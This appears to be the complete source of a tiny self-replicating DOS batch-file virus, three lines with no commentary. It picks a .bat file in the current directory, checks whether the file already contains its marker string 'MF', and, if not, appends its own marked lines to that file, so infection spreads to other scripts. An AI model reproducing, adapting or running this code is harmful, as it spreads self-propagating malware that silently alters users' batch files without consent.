@for %%b in (*.bat) do set MF=%%b
@find "MF"<%MF%>nul
@if errorlevel 1 find "MF"<%0>>%MF%
